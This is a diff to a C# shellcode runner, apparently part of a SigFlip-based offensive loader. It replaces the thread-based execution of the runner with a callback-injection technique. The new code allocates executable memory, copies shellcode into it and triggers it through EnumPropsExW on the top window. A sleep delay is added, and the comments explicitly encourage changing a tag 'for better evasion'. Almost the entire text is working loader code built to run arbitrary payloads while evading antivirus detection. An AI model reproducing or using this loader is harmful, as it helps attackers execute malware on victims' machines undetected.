@@ -22,13 +22,22 @@ public class codebase
 	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
 	   
     [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
+    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 
     [DllImport("kernel32.dll")]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetTopWindow(IntPtr hwnd);
+    
+    // Execution technique from here https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/NativePayload_EnumPropsExW.cs
+    [DllImport("user32.dll")]
+    private static extern int EnumPropsExW(IntPtr hwnd, IntPtr lpenumfunc, IntPtr lparam);
+
+    public delegate void AsyncCallBack();
     
     // Static tag from SigFlip - Modify in SigFlip and below for better evasion!
     public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
@@ -103,8 +112,6 @@ public class codebase
     // Shellcode Runner
     public static void registered(byte[] input)
     {
-        uint threadId;
-
         // Allocate space
         IntPtr alloc = VirtualAlloc(IntPtr.Zero, input.Length, 0x1000 | 0x2000, 0x40);
         if (alloc == IntPtr.Zero)
@@ -116,8 +123,11 @@ public class codebase
         Marshal.Copy(input, 0, alloc, input.Length);
 
         // Execute
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+        IntPtr p2 = GetTopWindow(IntPtr.Zero);
+
+        System.Threading.Thread.Sleep(5555);
+
+        int ok = EnumPropsExW(p2, alloc, IntPtr.Zero);
     }
 
     public static void WriteFile(string filename, byte[] rawData)
